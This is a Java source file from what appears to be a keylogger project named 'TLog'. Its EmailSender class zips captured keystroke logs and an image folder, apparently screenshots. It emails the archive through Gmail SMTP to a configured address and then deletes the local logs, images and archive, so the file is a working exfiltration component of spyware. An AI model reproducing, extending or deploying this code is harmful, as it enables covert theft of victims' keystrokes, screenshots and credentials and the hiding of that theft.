package email;

import constants.Constants;
import lombok.NoArgsConstructor;
import models.Email;
import models.Settings;
import utils.*;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.Properties;

/**
 * @author Denic
 */
@NoArgsConstructor
public class EmailSender {
    private final String host = "smtp.gmail.com";
    private final String port = "587";
    private final String username = "";
    private final String password = "";
    private final String messageSubject = "TLog - Keylogger";
    private Settings settings = null;


    public void start(Settings settings) {
        Validation.checkIsSettingsSet(settings);
        this.settings = settings;
        sendEmail(settings.getEmail());
    }

    private void sendEmail(String toAddress) {
        try {
            Transport.send(initMimeMessage(Session.getInstance(initProperties(), initAuthenticator()), toAddress));
            setEmail();
            emptyAllFolders();
        } catch (MessagingException | IOException e) {
            Logger.insertLog(e);
        }
    }

    private File createZipFile() {
        File forSend = FileUtil.createDirectory(Constants.FOR_SEND_FOLDER_NAME);
        prepareForSendFolder();
        Zipper.zipFolder(new File(Constants.IMAGE_FOLDER_NAME), new File(forSend.getAbsolutePath() + "/" + Constants.IMAGES_ZIP_NAME));
        Zipper.zipFolder(forSend, new File(Constants.SEND_ZIP_NAME));
        return new File(Constants.SEND_ZIP_NAME);
    }

    private Message initMimeMessage(Session session, String toAddress) throws MessagingException, IOException {
        InternetAddress[] toAddresses = {new InternetAddress(toAddress)};
        return new MimeMessage(session) {
            {
                setFrom(new InternetAddress(username));
                setRecipients(Message.RecipientType.TO, toAddresses);
                setSubject(messageSubject);
                setSentDate(new Date());
                setContent(new MimeMultipart() {
                    {
                        addBodyPart(new MimeBodyPart() {
                            {
                                attachFile(createZipFile());
                            }
                        });
                    }
                });
            }
        };
    }

    private Properties initProperties() {
        return new Properties() {
            {
                put("mail.smtp.host", host);
                put("mail.smtp.port", port);
                put("mail.smtp.auth", "true");
                put("mail.smtp.starttls.enable", "true");
            }
        };
    }

    private Authenticator initAuthenticator() {
        return new Authenticator() {
            @Override
            public PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        };
    }

    private void prepareForSendFolder() {
        File[] files = new File(Constants.LOG_FOLDER_NAME).listFiles();
        if (files != null) {
            for (File file : files) {
                FileUtil.writeInFileFromFile(file, new File(Constants.FOR_SEND_FOLDER_NAME + "/" + file.getName()), true);
            }
        }
    }

    private void setEmail() {
        Calendar calendar = new GregorianCalendar();
        calendar.add(Calendar.DATE, settings.getDelete());
        Date date = calendar.getTime();
        LoadSettings.saveSettingsForEmail(new Email(new SimpleDateFormat("dd-MM-yyyy").format(date), false));
    }

    private void emptyAllFolders() {
        FileUtil.deleteSubFiles(new File(Constants.IMAGE_FOLDER_NAME), false);
        FileUtil.deleteSubFiles(new File(Constants.LOG_FOLDER_NAME), false);
        FileUtil.deleteSubFiles(new File(Constants.FOR_SEND_FOLDER_NAME), true);
        FileUtil.deleteFile(new File(Constants.SEND_ZIP_NAME));
    }

    public void setSettings(Settings settings) {
        this.settings = settings;
    }
}
